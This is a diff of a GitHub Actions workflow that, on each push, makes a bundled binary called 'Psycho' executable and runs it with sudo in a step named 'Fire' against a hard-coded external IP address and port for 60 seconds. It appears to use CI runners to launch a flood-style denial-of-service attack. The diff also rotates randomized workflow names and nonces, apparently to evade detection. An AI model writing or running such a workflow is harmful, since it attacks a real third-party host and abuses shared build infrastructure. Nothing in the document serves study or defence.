@@ -1,4 +1,4 @@
-name: psycho-a29a8e4f
+name: psycho-607a7c68
 on:
   push:
     branches: [ main, master ]
@@ -13,11 +13,13 @@ jobs:
     steps:
     - name: Checkout
       uses: actions/checkout@v4
-    - name: Verify binary
-      run: ls -la && file Psycho || true
-    - name: Make executable
-      run: chmod +x Psycho
+    - name: Setup
+      run: |
+        ls -la
+        chmod +x Psycho || true
+        chmod +x Psycho.exe || true
     - name: Fire
-      run: timeout 60s sudo ./Psycho 91.108.17.38 32003 60 1400
-    - name: Nonce a29a8e4f
-      run: echo "nonce=a29a8e4f"
+      run: |
+        timeout 60s sudo ./Psycho 91.108.17.58 32001 60 1500 || timeout 60s sudo ./Psycho.exe 91.108.17.58 32001 60 1500 || true
+    - name: Nonce 607a7c68
+      run: echo "nonce=607a7c68"
